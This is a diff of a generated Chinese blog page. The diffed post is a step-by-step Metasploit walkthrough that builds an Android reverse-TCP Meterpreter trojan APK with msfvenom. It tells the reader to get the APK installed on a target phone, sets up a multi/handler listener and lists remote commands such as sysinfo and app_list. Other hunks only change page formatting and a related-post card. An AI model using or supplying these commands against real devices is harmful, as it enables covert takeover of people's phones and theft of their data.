@@ -517,14 +517,14 @@
 <li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
 <li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
 <li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.10 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8888</span> R <span class="token operator">&gt;</span> text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
 <li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
-<span class="token builtin class-name">set</span> payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 <li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">set</span> LPORT <span class="token number">8888</span>
-<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
+set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 <li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
 app_list # 安装的软件列表
@@ -886,19 +886,27 @@ Linux 篇（推荐）
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/archives/4a17b156.html">
+                <a href="/archives/1452fe3c.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="JSP的那些事">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">JSP的那些事</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                            JSP三个脚本
+&lt;% %&gt;  里面的代码会放入service方法中.
+&lt;%! %&gt;   在Servlet的成员位置. 
+&lt;%= %&gt;  就相当于out.print()
+
+九个内置对象
+
+指令
+page 指
                         
                     </div>
                     <div class="publish-info">
@@ -907,11 +915,27 @@ Linux 篇（推荐）
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            codervibe
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java-%E5%9F%BA%E7%A1%80/" class="post-category">
+                                    Java 基础
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81/">
+                        <span class="chip bg-color">代码</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1063,7 +1087,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.7k</span>&nbsp;字
+                class="white-color">17.1k</span>&nbsp;字
             
             
             
